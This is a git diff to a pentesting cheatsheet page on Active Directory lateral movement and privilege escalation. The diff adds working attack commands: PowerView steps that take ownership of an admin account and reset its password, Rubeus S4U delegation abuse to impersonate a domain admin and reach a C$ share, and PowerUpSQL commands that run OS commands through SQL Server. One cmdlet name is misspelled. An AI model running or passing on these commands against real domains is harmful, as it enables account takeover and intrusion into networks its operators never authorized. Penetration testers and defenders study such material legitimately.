@@ -1,10 +1,10 @@
 ---
 layout: post
-title: TA0008 Lateral Movement - AD Privilege Escalation with Powershell
+title: TA0008 Lateral Movement - AD Privilege Escalation
 parent: Pentesting
 category: Pentesting
 grand_parent: Cheatsheets
-modified_date: 2022-02-11
+modified_date: 2022-07-19
 permalink: /:categories/:title/
 ---
 <!-- vscode-markdown-toc -->
@@ -65,6 +65,26 @@ Invoke-SMBExec
 Invoke-PsExec
 Invoke-Command
 mstsc.exe
+
+# BH edge WriteOwner
+. .\PowerView.ps1
+Set-DomainObjectOwner -Identity admin -OwnerIdentity jfrank_owned -Verbose
+Add-DomainObjectAcl -TargetIdentity admin -PrincipalIdentity jfrank_owned -Rights ResetPassword -Verbose
+$UserPassword = ConvertTo-SecureString 'Password01' -AsPlainText -Force
+Set-DomainUSerPAsswore -Identity admin -AccountPassword $UserPassword -Verbose
+
+# BH edge AllowedToAct \{Protected Users,Sensitive} (TrustedDelegation Abuse)
+rubeus.exe hash /user:admin /password:Password01 /domain:contoso
+rubeus.exe s4u /user:admin /rc4:xxx /impersonateuser:da_contoso /msdsspn:cifs/share01.contoso /ptt
+dir \\share01.contoso\c$
+
+# BH edge SQLadmin (part of SPNTargets Collection Method)
+. .\PowerUpSQL.ps1
+Get-SQLInstanceScanUDP -ComputerName mssql01.contoso
+Get-SQLSysadminCheck -Instance CONTOSO\msqsql01
+Invoke-SQLOSCmd -Verbose -Command "whoami" -Instance CONTOSO\mssql01
+Invoke-SQLOSCmd -Verbose -Command "net session" -Instance CONTOSO\mssql01 #need local admin rights
+
 ```
 
 ## <a name='PRIVESC'></a>PRIVESC
